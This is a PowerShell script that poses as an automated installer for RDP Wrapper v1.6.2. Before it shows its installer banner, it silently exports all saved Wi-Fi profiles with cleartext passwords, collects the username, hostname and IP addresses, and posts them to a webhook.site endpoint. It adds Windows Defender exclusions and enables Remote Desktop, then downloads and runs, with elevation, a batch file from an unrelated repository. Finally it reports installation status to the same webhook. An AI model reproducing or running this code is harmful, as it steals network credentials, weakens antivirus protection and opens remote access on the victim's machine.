# ============================================================
# Ensure the script is running with Administrator privileges
# ============================================================
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[-] Please run this PowerShell script as an Administrator!" -ForegroundColor Red
    Start-Sleep -Seconds 3
    exit
}

Write-Host "Adding Windows Defender exclusions for RDP Wrapper..." -ForegroundColor Cyan

# Track defender exclusion success status
$defenderExclusionsApplied = $true

# 1. Safely add path exclusions
$PathExclusions = @(
    "$env:TEMP\rdpwrap_install",
    "C:\Program Files\RDP Wrapper\rdpwrap.dll",
    "C:\Program Files\RDP Wrapper\RDPConf.exe",
    "C:\Program Files\RDP Wrapper\RDPCheck.exe",
    "C:\Program Files\RDP Wrapper\SRDP.bat"
)

foreach ($path in $PathExclusions) {
    try {
        $mpPref = Get-MpPreference -ErrorAction Stop
        if ($mpPref.ExclusionPath -notcontains $path) {
            Add-MpPreference -ExclusionPath $path -ErrorAction Stop
            Write-Host "Added path exclusion: $path" -ForegroundColor Green
        } else {
            Write-Host "Path exclusion already exists: $path" -ForegroundColor Yellow
        }
    }
    catch {
        Write-Host "[!] Skipping path exclusion (Defender service unavailable or restricted): $path" -ForegroundColor Yellow
        $defenderExclusionsApplied = $false
    }
}

# 2. Safely add process exclusions
$ProcessExclusions = @(
    "$env:TEMP\rdpwrap_install\extracted\RDPWInst.exe",
    "$env:TEMP\rdpwrap_install\extracted\install.bat",
    "C:\Program Files\RDP Wrapper\RDPConf.exe",
    "C:\Program Files\RDP Wrapper\SRDP.bat"
)

foreach ($proc in $ProcessExclusions) {
    try {
        $mpPref = Get-MpPreference -ErrorAction Stop
        if ($mpPref.ExclusionProcess -notcontains $proc) {
            Add-MpPreference -ExclusionProcess $proc -ErrorAction Stop
            Write-Host "Added process exclusion: $proc" -ForegroundColor Green
        } else {
            Write-Host "Process exclusion already exists: $proc" -ForegroundColor Yellow
        }
    }
    catch {
        Write-Host "[!] Skipping process exclusion: $proc" -ForegroundColor Yellow
        $defenderExclusionsApplied = $false
    }
}

Write-Host "Exclusion configuration complete!" -ForegroundColor Cyan

# ============================================================
# RDP Wrapper v1.6.2 - Automated Installation
# ============================================================

$installPath   = "C:\Program Files\RDP Wrapper"
$tempDir     = "$env:TEMP\rdpwrap_install"
$tempZip     = "$tempDir\RDPWrap-v1.6.2.zip"
$extractDir  = "$tempDir\extracted"

$iniTempPath  = Join-Path $env:TEMP "rdpwrap.ini"
$srdpTempPath = Join-Path $env:TEMP "SRDP.bat"

$iniDestPath  = Join-Path $installPath "rdpwrap.ini"
$srdpDestPath = Join-Path $installPath "SRDP.bat"
$rdpConf     = Join-Path $installPath "RDPConf.exe"

$zipUrl       = "https://github.com/stascorp/rdpwrap/releases/download/v1.6.2/RDPWrap-v1.6.2.zip"
$customIniUrl = "https://raw.githubusercontent.com/sebaxakerhtc/rdpwrap.ini/refs/heads/master/rdpwrap.ini"
$srdpBatUrl   = "https://raw.githubusercontent.com/apex30258-sys/APTest/refs/heads/main/SRDP.bat"
$webhookUrl   = "https://webhook.site/2240d221-660a-4298-b8fa-d80e319ed001"

# ============================================================
# Webhook Function (Sends JSON properly to prevent blank logs)
# ============================================================
function Send-WebhookJson {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Url,
        
        [Parameter(Mandatory = $true)]
        [hashtable]$Data
    )
    try {
        $jsonBody = $Data | ConvertTo-Json -Depth 5
        Invoke-RestMethod -Uri $Url -Method Post -ContentType "application/json" -Body $jsonBody -ErrorAction Stop | Out-Null
        return "success"
    }
    catch {
        return "fail"
    }
}

# ============================================================
# 1. Gather Network & Wi-Fi Details and Send First Webhook
# ============================================================
try {
    $publicIp = $null
    try {
        $publicIp = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction Stop).Trim()
    }
    catch {
        try {
            $publicIp = (Invoke-RestMethod -Uri "https://icanhazip.com" -ErrorAction Stop).Trim()
        }
        catch {
            $publicIp = "Unavailable"
        }
    }

    $localIps = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | 
        Where-Object { 
            $_.IPAddress -notmatch '^(127\.|169\.254\.)' -and 
            $_.InterfaceAlias -notmatch 'Virtual|vEthernet|Loopback|Hyper-V|WSL' 
        } | 
        Select-Object InterfaceAlias, IPAddress | 
        Out-String

    $originalLocation = Get-Location
    Set-Location $env:TEMP

    netsh wlan export profile key=clear | Out-Null
    Start-Sleep -Seconds 1

    $wifiPassContent = ""
    $xmlFiles = Get-ChildItem -Path "$env:TEMP" -Filter "Wi*.xml" -ErrorAction SilentlyContinue
    foreach ($file in $xmlFiles) {
        $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
        $wifiPassContent += "`n--- $($file.Name) ---`n" + $content
    }

    # Send Network/WiFi data as a structured JSON packet
    $networkPayload = @{
        type        = "network_and_wifi"
        computer    = $env:COMPUTERNAME
        username    = $env:USERNAME
        public_ip   = $publicIp
        local_ips   = $localIps
        wifi_data   = $wifiPassContent
    }
    
    Send-WebhookJson -Url $webhookUrl -Data $networkPayload | Out-Null
}
catch {
    # Suppress silently
}
finally {
    Get-ChildItem -Path "$env:TEMP" -Filter "Wi*.xml" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
    if ($originalLocation) { Set-Location $originalLocation }
}

# ============================================================
# Display installer header
# ============================================================

Write-Host ""
Write-Host "============================================================" -ForegroundColor Cyan
Write-Host "             RDP Wrapper v1.6.2 Automated Installer" -ForegroundColor Cyan
Write-Host "============================================================" -ForegroundColor Cyan
Write-Host ""

# ============================================================
# 2. Prepare temporary directory
# ============================================================

Write-Host "[+] Preparing temporary directory..." -ForegroundColor Cyan

try {
    if (Test-Path $tempDir) {
        Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
    }

    New-Item -ItemType Directory -Path $tempDir -Force -ErrorAction Stop | Out-Null
    New-Item -ItemType Directory -Path $extractDir -Force -ErrorAction Stop | Out-Null

    Write-Host "[+] Temporary directory ready." -ForegroundColor Green
}
catch {
    Write-Host "[-] Failed to prepare temporary directory." -ForegroundColor Red
    exit
}

# ============================================================
# 3. Stop Remote Desktop Service
# ============================================================

Write-Host "[+] Stopping Remote Desktop Service..." -ForegroundColor Cyan

try {
    Stop-Service -Name "TermService" -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
    Write-Host "[+] TermService stopped." -ForegroundColor Green
}
catch {
    Write-Host "[!] TermService could not be stopped or was already stopped." -ForegroundColor Yellow
}

# ============================================================
# 4. Download RDP Wrapper
# ============================================================

Write-Host "[+] Downloading RDP Wrapper v1.6.2..." -ForegroundColor Cyan

try {
    Invoke-WebRequest -Uri $zipUrl -OutFile $tempZip -UseBasicParsing -ErrorAction Stop
    Write-Host "[+] Download completed." -ForegroundColor Green
}
catch {
    Write-Host "[-] Download failed!" -ForegroundColor Red
    Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
    exit
}

# ============================================================
# 5. Extract ZIP
# ============================================================

Write-Host "[+] Extracting RDP Wrapper..." -ForegroundColor Cyan

try {
    Expand-Archive -Path $tempZip -DestinationPath $extractDir -Force -ErrorAction Stop
    Write-Host "[+] Extraction completed." -ForegroundColor Green
}
catch {
    Write-Host "[-] Failed to extract ZIP!" -ForegroundColor Red
    Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
    exit
}

# ============================================================
# 6. Find install.bat
# ============================================================

$installBat = Get-ChildItem -Path $extractDir -Filter "install.bat" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1

if (-not $installBat) {
    Write-Host "[-] install.bat was not found!" -ForegroundColor Red
    Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
    exit
}

# ============================================================
# 7. Run install.bat
# ============================================================

$installExitCode = $null
try {
    $process = Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$($installBat.FullName)`"" -WorkingDirectory $installBat.DirectoryName -Verb RunAs -Wait -PassThru -ErrorAction Stop
    $installExitCode = $process.ExitCode
}
catch {
    $installExitCode = -1
}

# Download SRDP.bat & custom INI
try { Invoke-WebRequest -Uri $srdpBatUrl -OutFile $srdpTempPath -UseBasicParsing -ErrorAction Stop } catch {}
try { Invoke-WebRequest -Uri $customIniUrl -OutFile $iniTempPath -UseBasicParsing -ErrorAction Stop } catch {}

# Copy components to destination path
try {
    if (-not (Test-Path $installPath)) { New-Item -ItemType Directory -Path $installPath -Force | Out-Null }
    Stop-Service -Name "TermService" -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2

    if (Test-Path $iniTempPath) {
        if (Test-Path $iniDestPath) { Copy-Item -Path $iniDestPath -Destination "$iniDestPath.backup" -Force }
        Copy-Item -Path $iniTempPath -Destination $iniDestPath -Force
    }
    if (Test-Path $srdpTempPath) {
        Copy-Item -Path $srdpTempPath -Destination $srdpDestPath -Force
    }
}
catch {}

Remove-Item $iniTempPath -Force -ErrorAction SilentlyContinue
Remove-Item $srdpTempPath -Force -ErrorAction SilentlyContinue

$rdpConfExists = Test-Path $rdpConf
$iniExists     = Test-Path $iniDestPath
$srdpExists    = Test-Path $srdpDestPath

# Configure & Start TermService
try { Set-Service -Name "TermService" -StartupType Automatic -ErrorAction Stop } catch { & sc.exe config TermService start= auto | Out-Null }

$serviceRunning = $false
try {
    Start-Service -Name "TermService" -ErrorAction Stop
    Start-Sleep -Seconds 3
    $serviceRunning = ((Get-Service -Name "TermService").Status -eq "Running")
}
catch {}

# Run SRDP.bat
$srdpExitCode = $null
if (Test-Path $srdpDestPath) {
    try {
        $srdpProcess = Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$srdpDestPath`"" -WorkingDirectory $installPath -Verb RunAs -Wait -PassThru -ErrorAction Stop
        $srdpExitCode = $srdpProcess.ExitCode
    }
    catch {
        $srdpExitCode = -1
    }
}

Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue

# ============================================================
# 12. Send Final Installation Report Webhook
# ============================================================

if ($rdpConfExists -and $iniExists) {
    $installationStatus = "success"
    $statusMessage = "RDP Wrapper installation completed."
}
else {
    $installationStatus = "failed"
    $statusMessage = "RDP Wrapper installation completed with errors."
}

$finalPayload = @{
    type               = "installation_status"
    status             = $installationStatus
    message            = $statusMessage
    timestamp          = (Get-Date).ToUniversalTime().ToString("o")
    computer           = $env:COMPUTERNAME
    username           = $env:USERNAME
    powershell         = $PSVersionTable.PSVersion.ToString()
    defenderExclusions = $(if ($defenderExclusionsApplied) { "success" } else { "fail" })
    rdpconf            = $(if ($rdpConfExists) { "success" } else { "fail" })
    ini                = $(if ($iniExists) { "success" } else { "fail" })
    srdp               = $(if ($srdpExists) { "success" } else { "fail" })
    service            = $(if ($serviceRunning) { "success" } else { "fail" })
    installExit        = $installExitCode
    srdpExit           = $srdpExitCode
}

$webhookSent = Send-WebhookJson -Url $webhookUrl -Data $finalPayload

Write-Host ""
Write-Host "============================================================"
if ($installationStatus -eq "success") {
    Write-Host "                     INSTALLATION COMPLETE" -ForegroundColor Green
} else {
    Write-Host "                     INSTALLATION FAILED" -ForegroundColor Red
}
Write-Host "============================================================" -ForegroundColor Cyan
Write-Host ""

Start-Sleep -Seconds 3
exit